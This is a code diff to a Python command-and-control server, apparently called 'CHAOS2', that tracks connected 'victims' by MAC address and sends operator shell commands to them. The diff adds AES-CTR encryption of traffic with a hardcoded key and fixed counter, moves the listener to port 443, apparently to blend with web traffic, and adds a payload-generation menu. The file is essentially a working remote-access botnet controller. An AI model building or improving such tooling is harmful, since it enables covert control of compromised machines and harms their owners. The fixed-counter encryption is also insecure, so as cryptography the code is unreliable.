@@ -1,12 +1,31 @@
 import socket
 import threading
 import json
+import sys
+import signal
+from Crypto.Cipher import AES
+
 
 conn_list={}
+counter = b"H"*16
+key = b"H"*32
+
+
+
+def encrypt(message):
+    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
+    return encrypto.encrypt(message)
+
+def decrypt(message):
+    decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
+    return  decrypto.decrypt(message) 
+
+
 def server():
     global conn_list
+    global PORT
     HOST = ''
-    PORT = 5000
+    PORT = 443
     global count
     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -17,12 +36,12 @@ def server():
         conn, addr = s.accept()
         mac=""
         if conn:
-            mac=conn.recv(4098).decode('utf-8')
+            mac=decrypt(conn.recv(4098)).decode('utf-8')
             if mac:
                 if mac in conn_list:
-                    print(bcolors.OKGREEN,"\n[*] Victim Online:{}".format(mac))
+                    print(bcolors.OKGREEN,"\n[*] Target Online:{}".format(mac))
                 else:
-                    print(bcolors.OKBLUE,"\n[+] Victim Added:{}".format(mac))
+                    print(bcolors.OKBLUE,"\n[+] New Target Added:{}".format(mac))
                     conn_list[mac]=conn
 
 def client():
@@ -33,7 +52,7 @@ def client():
             count+=1
             print("{}) {}".format(count,key))
     else:
-        print(bcolors.FAIL,"\n[]List is empty")
+        print(bcolors.FAIL,"\n[*] List is empty")
 
 
 
@@ -58,8 +77,8 @@ def console(conn,bot,socket_target):
             return 0
         else:
             commands = bytes(commands, 'utf-8')
-            conn.sendall(commands) # Otherwise we will send the command to the target
-            out=conn.recv(64000).decode('utf-8') # and print the result that we got back
+            conn.sendall(encrypt(commands)) # Otherwise we will send the command to the target
+            out=decrypt(conn.recv(64000)).decode('utf-8') # and print the result that we got back
             print(out)
            # if out=="Dead":
             #    print(bcolors.FAIL,"====Host:{} went offline===".format(bot))
@@ -69,6 +88,14 @@ def console(conn,bot,socket_target):
                 #print(out)
 
 
+def generatePayload():
+    print("[*] Let's generate payloadz")
+    #option=input("LHOST> ")
+    # Read payload file, and replace host variable 
+    f = open("payload.py", "r")
+    for line in f:
+        print(line)
+    f.close()
 
 def banner():
     print("")
@@ -77,17 +104,16 @@ def banner():
     print("██║     ███████║███████║██║   ██║███████╗ █████╔╝")
     print("██║     ██╔══██║██╔══██║██║   ██║╚════██║██╔═══╝ ")
     print("╚██████╗██║  ██║██║  ██║╚██████╔╝███████║███████╗")
-    print(" ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝")
-    print("")                               
+    print(" ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝")                             
 
 def main():
     banner()
     threading.Thread(target=server).start()
-    print(bcolors.ENDC,"[+] Server Started")
-    print("Type help or ? for options")
+    print(bcolors.HEADER,"\n[*] Server Started - Listening on port: " + str(PORT))
+    print("[*] Type help or ? for options")
     while True:
         print(bcolors.ENDC)
-        choice=input("> ")
+        choice=input("CHAOS2> ")
         choice.replace(" ", "")
         if choice=='hosts' or choice =='h':
             p=threading.Thread(target=client)
@@ -98,7 +124,9 @@ def main():
             p.start()
             p.join()
         elif choice =='help' or choice =='?':
-            print(bcolors.HEADER,"\n==========\nhosts or h :To check for available victims online\ninteract or i :To interact with a target\n==========")
+            print(bcolors.HEADER,"\n==========\n[+] hosts or h (To check for available victims online)\n[+] interact or i (To interact with a target)\n==========")
+        elif choice =='payload':
+            generatePayload()
         else:
             pass
 
@@ -113,4 +141,14 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
-main()
+try:
+    main()
+except:
+    print(bcolors.HEADER," \n[!] ooof bye :(")
+    
+
+
+
+
+
+
